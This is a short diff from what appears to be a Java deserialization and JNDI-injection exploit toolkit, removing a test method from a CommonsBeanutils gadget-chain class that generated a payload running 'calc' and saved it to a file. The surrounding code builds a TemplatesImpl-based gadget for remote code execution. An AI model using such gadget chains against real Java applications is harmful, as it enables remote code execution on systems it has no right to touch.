@@ -6,19 +6,12 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.utils.MyURLClassLoader;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
 public class CommonsBeanutils2 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(type, param);
